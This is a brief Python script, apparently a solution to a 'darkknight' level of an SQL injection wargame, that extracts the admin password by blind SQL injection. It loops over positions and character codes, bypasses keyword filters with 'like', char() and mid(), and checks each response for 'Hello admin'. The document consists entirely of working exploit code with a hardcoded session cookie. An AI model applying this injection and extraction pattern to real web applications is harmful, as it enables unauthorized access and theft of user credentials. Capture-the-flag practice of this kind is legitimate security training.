import requests
cookies = {'PHPSESSID': 's3pme5nhda93k7jt7khal1al5u'}
length = 8
for a in range(1, length+1):
    for b in range(48,123):
        URL = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no=0%20or%20id%20like%20char(97,100,109,105,110)%20and%20ord(mid(pw," +str(a)+ ",1))%20like%20" +str(b)+ "%23"
        res = requests.get(URL, cookies=cookies)

        if "<h2>Hello admin</h2>" in res.text:
            print(str(chr(b)))
            break

